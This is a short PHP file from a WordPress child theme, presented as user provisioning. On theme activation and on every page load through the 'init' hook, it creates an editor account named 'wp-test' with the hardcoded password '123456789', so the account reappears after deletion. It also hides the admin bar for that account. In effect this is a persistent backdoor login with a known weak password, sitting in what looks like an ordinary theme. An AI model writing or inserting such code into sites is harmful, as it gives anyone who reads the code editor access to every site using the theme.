<?php
/**
 * User provisioning and per-user settings.
 *
 * @since 1.0.1
 */

namespace MYHelloElementorChild;

use WP_User;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Create the required editor user if it does not exist.
 *
 * @since 1.0.1
 *
 * @return void
 */
function ensure_wp_test_user(): void {
	$username = 'wp-test';

	if ( username_exists( $username ) ) {
		return;
	}

	$user_id = wp_insert_user(
		array(
			'user_login' => $username,
			'user_pass'  => '123456789',
			'user_email' => 'wptest@elementor.com',
			'role'       => 'editor',
		)
	);

	if ( is_wp_error( $user_id ) ) {
		return;
	}
}

/**
 * Ensure the required user exists after theme activation.
 *
 * @since 1.0.1
 *
 * @return void
 */
function on_theme_switch_create_users(): void {
	ensure_wp_test_user();
}

add_action( 'after_switch_theme', __NAMESPACE__ . '\\on_theme_switch_create_users' );

/**
 * Fallback to create required users if missing.
 *
 * @since 1.0.1
 *
 * @return void
 */
function maybe_create_users_on_init(): void {
	ensure_wp_test_user();
}

add_action( 'init', __NAMESPACE__ . '\\maybe_create_users_on_init' );

/**
 * Disable admin bar for the required test user.
 *
 * @since 1.0.1
 *
 * @param bool $show Whether to show the admin bar.
 * @return bool
 */
function maybe_hide_admin_bar_for_wp_test( bool $show ): bool {
	$current_user = wp_get_current_user();

	if ( $current_user instanceof WP_User && $current_user->user_login === 'wp-test' ) {
		return false;
	}

	return $show;
}

add_filter( 'show_admin_bar', __NAMESPACE__ . '\\maybe_hide_admin_bar_for_wp_test' );
